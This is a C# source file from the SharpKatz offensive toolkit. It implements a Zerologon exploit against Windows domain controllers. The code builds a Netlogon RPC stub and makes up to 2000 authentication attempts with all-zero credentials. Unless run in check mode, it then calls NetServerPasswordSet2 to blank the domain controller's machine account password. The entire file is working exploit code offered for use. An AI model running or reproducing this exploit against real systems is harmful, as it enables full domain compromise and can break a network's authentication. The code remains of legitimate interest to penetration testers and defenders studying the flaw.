//
// Author: B4rtik (@b4rtik)
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
//


using SharpKatz.Win32;
using System;
using System.Runtime.InteropServices;
using static SharpKatz.Win32.Natives;

namespace SharpKatz.Module
{
    class Zerologon
    {

        const int MAX_ATTEMPTS = 2000;

        static byte[] netlogonMIDLProcFormatString = new byte[]  {
            0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x28, 0x00, 0x31, 0x08, 0x00, 0x00, 0x00, 0x5c, 0x3c, 0x00, 0x44, 0x00, 0x46, 0x05, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x0b, 0x00, 0x00, 0x00, 0x02, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x08, 0x00, 0x0a, 0x01, 0x10, 0x00, 0x14, 0x00, 0x12, 0x21, 0x18, 0x00, 0x14, 0x00, 0x70, 0x00, 0x20, 0x00, 0x08, 0x00, 0x00, 0x48,
            0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x40, 0x00, 0x31, 0x08, 0x00, 0x00, 0x00, 0x5c, 0x5e, 0x00, 0x60, 0x00, 0x46, 0x08, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00,
            0x00, 0x00, 0x02, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x08, 0x00, 0x48, 0x00, 0x10, 0x00, 0x0d, 0x00, 0x0b, 0x01, 0x18, 0x00, 0x08, 0x00, 0x0a, 0x01, 0x20, 0x00, 0x14, 0x00, 0x12, 0x21, 0x28, 0x00,
            0x14, 0x00, 0x58, 0x01, 0x30, 0x00, 0x08, 0x00, 0x70, 0x00, 0x38, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x1e, 0x00, 0x40, 0x00, 0x31, 0x08, 0x00, 0x00, 0x00, 0x5c, 0x8e, 0x02,
            0x58, 0x00, 0x46, 0x08, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x02, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x08, 0x00, 0x48, 0x00, 0x10, 0x00, 0x0d, 0x00,
            0x0b, 0x01, 0x18, 0x00, 0x08, 0x00, 0x0a, 0x01, 0x20, 0x00, 0x2a, 0x00, 0x12, 0x41, 0x28, 0x00, 0x2a, 0x00, 0x0a, 0x01, 0x30, 0x00, 0x42, 0x00, 0x70, 0x00, 0x38, 0x00, 0x08, 0x00, 0x00, 0x48,
            0x00, 0x00, 0x00, 0x00, 0x2a, 0x00, 0x48, 0x00, 0x31, 0x08, 0x00, 0x00, 0x00, 0x5c, 0x56, 0x00, 0x40, 0x01, 0x46, 0x09, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00,
            0x00, 0x00, 0x02, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x08, 0x00, 0x48, 0x00, 0x10, 0x00, 0x0d, 0x00, 0x0b, 0x01, 0x18, 0x00, 0x08, 0x00, 0x0a, 0x01, 0x20, 0x00, 0x2a, 0x00, 0x12, 0x41, 0x28, 0x00,
            0x2a, 0x00, 0x12, 0x41, 0x30, 0x00, 0x5a, 0x00, 0x12, 0x41, 0x38, 0x00, 0x5a, 0x00, 0x70, 0x00, 0x40, 0x00, 0x08, 0x00, 0x00,
        };

        static byte[] netlogonMIDLTypeFormatString = new byte[]  {
            0x00, 0x00, 0x12, 0x08, 0x25, 0x5c, 0x11, 0x08, 0x25, 0x5c, 0x11, 0x00, 0x08, 0x00, 0x1d, 0x00, 0x08, 0x00, 0x02, 0x5b, 0x15, 0x00, 0x08, 0x00, 0x4c, 0x00, 0xf4, 0xff, 0x5c, 0x5b, 0x11, 0x04,
            0xf4, 0xff, 0x11, 0x08, 0x08, 0x5c, 0x11, 0x00, 0x02, 0x00, 0x15, 0x03, 0x0c, 0x00, 0x4c, 0x00, 0xe4, 0xff, 0x08, 0x5b, 0x11, 0x04, 0xf4, 0xff, 0x11, 0x00, 0x08, 0x00, 0x1d, 0x01, 0x00, 0x02,
            0x05, 0x5b, 0x15, 0x03, 0x04, 0x02, 0x4c, 0x00, 0xf4, 0xff, 0x08, 0x5b, 0x11, 0x04, 0x0c, 0x00, 0x1d, 0x00, 0x10, 0x00, 0x4c, 0x00, 0xbe, 0xff, 0x5c, 0x5b, 0x15, 0x00, 0x10, 0x00, 0x4c, 0x00,
            0xf0, 0xff, 0x5c, 0x5b, 0x00,
        };

        static GCHandle procString;
        static GCHandle formatString;
        static GCHandle stub;
        static GCHandle faultoffsets;
        static GCHandle genericRuotinePair;
        static IntPtr rpcConn;
        static IntPtr hLogon;

        static AllocMemoryFunctionDelegate allocMemoryFunctionDelegate;
        private delegate IntPtr AllocMemoryFunctionDelegate(int memsize);

        static FreeMemoryFunctionDelegate freeMemoryFunctionDelegate;
        private delegate void FreeMemoryFunctionDelegate(IntPtr memory);

        private static IntPtr AllocateMemory(int size)
        {
            IntPtr memory = Marshal.AllocHGlobal(size);
            return memory;
        }

        private static void FreeMemory(IntPtr memory)
        {
            Marshal.FreeHGlobal(memory);
        }

        static LogonSrvHandleBindFunctionDelegate logonSrvHandleBindFunctionDelegate;
        private delegate IntPtr LogonSrvHandleBindFunctionDelegate(IntPtr name);

        static LogonSrvHandleUnBindFunctionDelegate logonSrvHandleUnBindFunctionDelegate;
        private delegate void LogonSrvHandleUnBindFunctionDelegate(IntPtr name, IntPtr hLogon);

        private static IntPtr LogonSrvHandleBind(IntPtr name)
        {
            return rpcConn;
        }

        private static void LogonSrvHandleUnBind(IntPtr name, IntPtr hLogon)
        {
            //free handle;
        }

        public static bool RunZerologon(string mode, string target, string machineaccount, int auth, bool nullsession)
        {
            bool success = false;
            Console.Write("[*] ");


            rpcConn = DCSync.CreateBinding(target, null, auth, nullsession: nullsession);

            if (rpcConn == IntPtr.Zero)
            {
                Console.WriteLine("Error CreateBinding");
                return false;
            }

            NTSTATUS rpcStatus = (NTSTATUS)RpcEpResolveBinding(rpcConn, GetClientInterface());

            if (rpcStatus != NTSTATUS.Success)
            {
                Console.WriteLine("[x] Error RpcEpResolveBinding {0}", (int)rpcStatus);

                return false;
            }

            for (int i = 0; i < MAX_ATTEMPTS; i++)
            {
                success = Tryzerologonenticate(machineaccount);

                if (success == false)
                    Console.Write("=");
                else
                {
                    Console.WriteLine("[*]");
                    Console.WriteLine("[*] Authentication: Ok target vulnerable");

                    if (!mode.Equals("check"))
                    {
                        NTSTATUS status = ChangeDCPassword(machineaccount);

                        if (status == NTSTATUS.Success)
                        {
                            Console.WriteLine("[*] Set password: Ok");
                            return true;

                        }
                    }
                    else
                    {
                        return true;
                    }

                    break;
                }
            }



            return false;
        }

        private static bool Tryzerologonenticate(string targetcomputeraccount)
        {

            byte[] plaintext = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
            byte[] ciphertext = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

            NETLOGON_CREDENTIAL palintextcred = new NETLOGON_CREDENTIAL();
            palintextcred.data = plaintext;

            NETLOGON_CREDENTIAL chiphertextcred = new NETLOGON_CREDENTIAL();
            chiphertextcred.data = ciphertext;

            IntPtr pcred = Marshal.AllocHGlobal(Marshal.SizeOf(palintextcred));
            Marshal.StructureToPtr(palintextcred, pcred, false);

            uint flags = 0x212fffff;

            IntPtr computernamePtr = Marshal.StringToHGlobalUni("Neverland");

            IntPtr targetcomputeraccountPtr = Marshal.StringToHGlobalUni(targetcomputeraccount);

            NTSTATUS rpcStatus = (NTSTATUS)NetrServerReqChallenge(GetStubPtr(), GetProcStringPtr(0), IntPtr.Zero, computernamePtr, pcred, out chiphertextcred);

            uint rid = 0;

            try
            {
                rpcStatus = (NTSTATUS)NetrServerAuthenticate3(GetStubPtr(), GetProcStringPtr(62), IntPtr.Zero, targetcomputeraccountPtr, NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, computernamePtr, pcred, out chiphertextcred, out flags, out rid);

                if (rpcStatus == NTSTATUS.Success)
                {
                    Console.WriteLine("\n[*]");

                    return true;
                }
            }
            catch (Exception e)
            {
                if (rpcStatus != NTSTATUS.AccessDenied)
                    Console.WriteLine("Error: " + e.Message);
            }

            return false;
        }

        private static Natives.NTSTATUS ChangeDCPassword(string targetcomputeraccount)
        {
            byte[] plaintext = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
            byte[] ciphertext = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

            NETLOGON_CREDENTIAL palintextcred = new NETLOGON_CREDENTIAL
            {
                data = plaintext
            };

            NETLOGON_CREDENTIAL chiphertextcred = new NETLOGON_CREDENTIAL
            {
                data = ciphertext
            };

            NETLOGON_AUTHENTICATOR plainAuth = new NETLOGON_AUTHENTICATOR
            {
                Credential = palintextcred,
                Timestamp = 0
            };

            NETLOGON_AUTHENTICATOR cipherAuth = new NETLOGON_AUTHENTICATOR
            {
                Credential = chiphertextcred,
                Timestamp = 0
            };

            IntPtr pcred = Marshal.AllocHGlobal(Marshal.SizeOf(plainAuth));
            Marshal.StructureToPtr(plainAuth, pcred, false);

            IntPtr ccred = Marshal.AllocHGlobal(Marshal.SizeOf(cipherAuth));
            Marshal.StructureToPtr(cipherAuth, ccred, false);

            IntPtr computernamePtr = Marshal.StringToHGlobalUni("Neverland");

            IntPtr targetcomputeraccountPtr = Marshal.StringToHGlobalUni(targetcomputeraccount);

            NL_TRUST_PASSWORD tpass = new NL_TRUST_PASSWORD();

            IntPtr ptpass = Marshal.AllocHGlobal(Marshal.SizeOf(tpass));
            Marshal.StructureToPtr(tpass, ptpass, false);

            NTSTATUS rpcStatus = (NTSTATUS)NetServerPasswordSet2(GetStubPtr(), GetProcStringPtr(142), IntPtr.Zero, targetcomputeraccountPtr, NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, computernamePtr, pcred, ccred, ptpass);

            return (NTSTATUS)rpcStatus;
        }

        private static IntPtr GetClientInterface()
        {
            RPC_VERSION rpcv1 = new RPC_VERSION
            {
                MajorVersion = 1,
                MinorVersion = 0
            };

            RPC_VERSION rpcv2 = new RPC_VERSION
            {
                MajorVersion = 2,
                MinorVersion = 0
            };

            RPC_SYNTAX_IDENTIFIER InterfaceId = new RPC_SYNTAX_IDENTIFIER
            {
                SyntaxGUID = new Guid(0x12345678, 0x1234, 0xabcd, 0xef, 0x00, 0x01, 0x23, 0x45, 0x67, 0xcf, 0xfb),
                SyntaxVersion = rpcv1
            };

            RPC_SYNTAX_IDENTIFIER TransferSyntax = new RPC_SYNTAX_IDENTIFIER
            {
                SyntaxGUID = new Guid(0x8a885d04, 0x1ceb, 0x11c9, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60),
                SyntaxVersion = rpcv2
            };

            RPC_CLIENT_INTERFACE logonRpcClientInterface = new RPC_CLIENT_INTERFACE
            {
                Length = (uint)Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE)),
                InterfaceId = InterfaceId,
                TransferSyntax = TransferSyntax,
                DispatchTable = IntPtr.Zero,  //PRPC_DISPATCH_TABLE
                RpcProtseqEndpointCount = 0,
                RpcProtseqEndpoint = IntPtr.Zero, //PRPC_PROTSEQ_ENDPOINT
                Reserved = IntPtr.Zero,
                InterpreterInfo = IntPtr.Zero,
                Flags = 0x00000000
            };

            IntPtr plogonRpcClientInterface = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE)));
            Marshal.StructureToPtr(logonRpcClientInterface, plogonRpcClientInterface, false);

            return plogonRpcClientInterface;
        }

        private static IntPtr GetStubPtr()
        {
            if (!stub.IsAllocated)
            {

                procString = GCHandle.Alloc(netlogonMIDLProcFormatString, GCHandleType.Pinned);

                COMM_FAULT_OFFSETS commFaultOffset = new COMM_FAULT_OFFSETS
                {
                    CommOffset = -1,
                    FaultOffset = -1
                };

                faultoffsets = GCHandle.Alloc(commFaultOffset, GCHandleType.Pinned);
                formatString = GCHandle.Alloc(netlogonMIDLTypeFormatString, GCHandleType.Pinned);

                allocMemoryFunctionDelegate = AllocateMemory;
                freeMemoryFunctionDelegate = FreeMemory;
                IntPtr pAllocMemory = Marshal.GetFunctionPointerForDelegate(allocMemoryFunctionDelegate);
                IntPtr pFreeMemory = Marshal.GetFunctionPointerForDelegate(freeMemoryFunctionDelegate);

                logonSrvHandleBindFunctionDelegate = LogonSrvHandleBind;
                logonSrvHandleUnBindFunctionDelegate = LogonSrvHandleUnBind;
                IntPtr pLogonSrvHandleBind = Marshal.GetFunctionPointerForDelegate(logonSrvHandleBindFunctionDelegate);
                IntPtr pLogonSrvHandleUnBind = Marshal.GetFunctionPointerForDelegate(logonSrvHandleUnBindFunctionDelegate);

                GENERIC_BINDING_ROUTINE_PAIR rp = new GENERIC_BINDING_ROUTINE_PAIR();
                rp.Bind = pLogonSrvHandleBind;
                rp.Unbind = pLogonSrvHandleUnBind;

                genericRuotinePair = GCHandle.Alloc(rp, GCHandleType.Pinned);

                hLogon = IntPtr.Zero;

                MIDL_STUB_DESC stubObject = new MIDL_STUB_DESC
                {

                    RpcInterfaceInformation = GetClientInterface(),

                    pfnAllocate = pAllocMemory,
                    pfnFree = pFreeMemory,
                    pAutoBindHandle = hLogon,
                    apfnNdrRundownRoutines = IntPtr.Zero,
                    aGenericBindingRoutinePairs = genericRuotinePair.AddrOfPinnedObject(),
                    apfnExprEval = IntPtr.Zero,
                    aXmitQuintuple = IntPtr.Zero,
                    pFormatTypes = formatString.AddrOfPinnedObject(),
                    fCheckBounds = 1,
                    Version = 0x60000,
                    pMallocFreeStruct = IntPtr.Zero,
                    MIDLVersion = 0x8000253,
                    CommFaultOffsets = IntPtr.Zero,
                    aUserMarshalQuadruple = IntPtr.Zero,
                    NotifyRoutineTable = IntPtr.Zero,
                    mFlags = new IntPtr(0x00000001),
                    CsRoutineTables = IntPtr.Zero,
                    ProxyServerInfo = IntPtr.Zero,
                    pExprInfo = IntPtr.Zero,
                };

                stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);
            }

            return stub.AddrOfPinnedObject();
        }

        private static IntPtr GetProcStringPtr(int index)
        {
            return Marshal.UnsafeAddrOfPinnedArrayElement(netlogonMIDLProcFormatString, index);
        }
    }
}
